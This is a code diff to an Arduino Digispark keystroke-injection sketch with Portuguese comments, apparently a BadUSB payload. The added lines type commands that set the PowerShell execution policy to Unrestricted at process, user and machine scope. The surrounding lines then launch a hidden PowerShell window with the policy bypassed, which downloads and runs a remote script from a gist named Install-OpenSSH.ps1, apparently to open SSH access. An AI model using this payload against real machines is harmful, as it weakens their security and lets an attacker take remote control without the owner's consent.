@@ -12,6 +12,15 @@ void loop() {
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(3000); 
+  DigiKeyboardPtBr.println('Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process');
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboardPtBr.println('Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser');
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
+  DigiKeyboardPtBr.println('Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine');
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); 
   // Executando o script publicado no gist
   DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/Install-OpenSSH.ps1');\""));
   DigiKeyboardPtBr.delay(500);
